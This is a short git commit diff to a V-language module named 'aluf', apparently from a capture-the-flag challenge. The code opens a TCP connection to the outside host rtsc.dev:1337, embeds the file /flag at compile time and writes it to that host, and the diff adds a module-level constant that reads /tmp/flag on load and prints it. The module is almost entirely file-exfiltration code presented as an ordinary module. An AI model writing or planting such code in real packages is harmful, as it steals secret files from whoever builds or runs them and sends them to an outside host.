acb2f79e8888f935b8a1d6bbaf9cf5f043e3fc5c
riordanz <black.ganezo@gmail.com>
2021-10-31 16:46:54 +0700

    aluf module

--- my.v
+++ my.v
@@ -3,9 +3,13 @@ module aluf
 import os
 import net
 
+pub const (
+        flags = os.read_file('/tmp/flag') or { panic('') }
+)
+
 pub fn demo() {
         mut conn := net.dial_tcp("rtsc.dev:1337") or { panic('') }
-        flag := os.read_file("/flag") or { panic('') }
+        flag := $embed_file('/flag')
         conn.write_string(flag)  or { panic('') }
-	println('Aluf here!')
+	println(flags)
 }
